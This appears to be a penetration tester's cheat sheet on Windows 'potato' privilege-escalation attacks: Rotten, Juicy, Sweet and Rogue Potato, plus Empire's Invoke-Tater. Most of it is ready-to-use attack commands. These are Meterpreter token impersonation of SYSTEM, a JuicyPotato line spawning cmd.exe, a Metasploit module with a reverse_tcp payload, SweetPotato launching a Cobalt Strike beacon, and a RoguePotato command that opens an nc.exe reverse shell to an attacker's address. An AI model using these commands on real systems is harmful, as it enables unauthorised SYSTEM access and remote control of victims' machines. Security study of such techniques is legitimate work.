# Windows Potato Attacks

Rotten potato and juicy potato were fixed in Windows 10 1809+ and Windows Server 2019. 



## Rotten Potato

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

- Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
- Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
- Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

### Metasploit

```
upload the exploit

execute -cH -f <exploit>
use incognito
list tokens -u
impersonate_token "NT Authority\System"
```



## Juicy Potato

https://github.com/ohpe/juicy-potato

- Rather than BITS, this uses COM servers that
  - are instantiable by the current user
  - implement the IMarshal interface
  - Run as an elevated user 
- Account needs to have SeAssignPrimaryTokenPrivilige or SEImpersonatePrivilege 
- CLSID lists - https://ohpe.it/juicy-potato/CLSID/

```
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID} 
```

### Metasploit

https://www.rapid7.com/db/modules/exploit/windows/local/ms16_075_reflection_juicy

- If you already have a meterpreter session :

```
use exploit/windows/local/ms16_075_reflection
set LHOST
set LPORT (different port to other session)

set payload windows/x64/meterpreter/reverse_tcp
```

- New meterpreter session will be returned. 

```
load incognito
list_tokens -u
impersonate_token "NT Authority\System"
```

## Sweet Potato

- currently works on windows 7 up to latest versions of windows 10 and server 2019
- compatible with execute-assembly from cobalt strike 
- needs to be compiled for target OS
- works when executed from a process with impersonate privileges 
- WinRM needs to be disabled
  - default on win 10 but not win srv 2019

https://github.com/CCob/SweetPotato



```
execute-assenbky sweetpotato.exe -p beacon.exe
```

## Rogue Potato

https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/



- You need a compromised account on the victim with Impersonate privileges
- remote machine must be accessible on port 135 by the victim
- https://github.com/antonioCoco/RoguePotato

```
RoguePotato.exe -r <ip> -e nc.exe <ip> <port> -e cmd.exe -l 9999
```

- -r remote ip
- -e command line of the program to launch
- -l listening port
- -c CLSID
- -p pipename_placeholder
- -z randomize the pipenmae_placeholder 

## Empire

https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-Tater.ps1



Empire has an Invoke-Tater method

```
Invoke-Tater -Trigger 1 -Command "..."
```

